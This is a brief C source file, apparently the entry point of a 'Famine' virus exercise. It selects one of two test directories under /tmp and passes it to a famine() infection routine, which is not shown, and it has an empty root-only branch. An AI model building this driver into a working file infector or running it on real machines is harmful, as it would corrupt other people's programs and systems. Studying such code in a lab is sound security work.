#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

static void handle_user(void)
{
	FUNC;

	size_t m_entry = 0;
	struct directory dir[] =
	{
		(struct directory){"/tmp/test/", 0},
		(struct directory){"/tmp/test2/", 0},
	};

	for (unsigned char index = 0; index < USER_SIZE; index++)
	{
		update_entry(&dir[index]);
		update_path(&dir[index]);
		m_entry += dir[index].entry;
	}

	famine(dir[get_random_integer(USER_SIZE)].path, m_entry);
}

static void handle_root(void)
{
	FUNC;
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void entry(void)
{
	if (_getuid() == 0)
		handle_root();
	else
		handle_user();
}

////////////////////////////////////////////////////////////////////////////////
/// BOOTSTRAP FUNCTION
////////////////////////////////////////////////////////////////////////////////

int main(void)
{
	entry();
}
